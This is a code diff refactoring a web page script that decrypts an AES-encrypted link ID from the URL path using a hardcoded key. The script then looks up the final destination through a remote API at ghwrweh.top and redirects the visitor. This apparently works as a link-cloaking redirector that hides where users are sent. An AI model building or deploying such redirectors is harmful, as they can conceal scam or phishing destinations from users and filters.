@@ -22,13 +22,11 @@
   <script>
     const AES_KEY = "5Ctianyoumabiiii";
 
-    // 从路径中提取加密内容
-    const encryptedPath = location.pathname.split("/").filter(Boolean).pop();
-
-    if (!encryptedPath) {
-      document.body.innerHTML += "<p style='color:red;'>リンクIDが存在しません。</p>";
+    const encText = location.pathname.split("/").filter(Boolean).pop();
+    if (!encText) {
+      document.body.innerHTML += "<p style='color:red;'>リンクIDが見つかりません。</p>";
     } else {
-      decryptAES(encryptedPath).then(decryptedUrl => {
+      decryptAES(encText).then(decryptedUrl => {
         if (!decryptedUrl) {
           document.body.innerHTML += "<p style='color:red;'>復号に失敗しました。</p>";
           return;
@@ -36,39 +34,37 @@
 
         try {
           const urlObj = new URL(decryptedUrl);
-          const siteName = urlObj.searchParams.get("siteName") || "";  // 例：https://domain.com?siteName=abc123
+          const siteName = urlObj.searchParams.get("siteName") || "";
 
           if (!siteName) {
-            // 若没有siteName参数，直接跳转
             setTimeout(() => location.href = decryptedUrl, 2000);
             return;
           }
 
           fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(siteName))
             .then(res => res.json())
-            .then(apiData => {
-              const finalUrl = apiData?.data?.siteUrl;
+            .then(data => {
+              const finalUrl = data?.data?.siteUrl;
               if (finalUrl) {
                 setTimeout(() => location.href = finalUrl, 2000);
               } else {
-                document.body.innerHTML += "<p style='color:red;'>APIでリダイレクト先が見つかりません。</p>";
+                document.body.innerHTML += "<p style='color:red;'>リダイレクト先が見つかりません。</p>";
               }
             })
             .catch(() => {
-              document.body.innerHTML += "<p style='color:red;'>API呼び出しエラー。</p>";
+              document.body.innerHTML += "<p style='color:red;'>APIエラーが発生しました。</p>";
             });
 
-        } catch {
-          // 解密后不是 URL 格式
-          document.body.innerHTML += "<p style='color:red;'>URL形式ではありません。</p>";
+        } catch (e) {
+          document.body.innerHTML += "<p style='color:red;'>URL形式が正しくありません。</p>";
         }
       });
     }
 
     async function decryptAES(encText) {
       try {
-        const base64 = encText.replace(/-/g, '+').replace(/_/g, '/');
-        const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
+        const fixedB64 = encText.replace(/-/g, '+').replace(/_/g, '/').padEnd(encText.length + (4 - encText.length % 4) % 4, '=');
+        const bytes = Uint8Array.from(atob(fixedB64), c => c.charCodeAt(0));
         const iv = bytes.slice(0, 16);
         const data = bytes.slice(16);
         const key = await crypto.subtle.importKey(
@@ -80,7 +76,8 @@
         );
         const decrypted = await crypto.subtle.decrypt({ name: "AES-CBC", iv }, key, data);
         return new TextDecoder().decode(decrypted).replace(/\u0000+$/, "");
-      } catch {
+      } catch (e) {
+        console.error("解密失败:", e);
         return null;
       }
     }
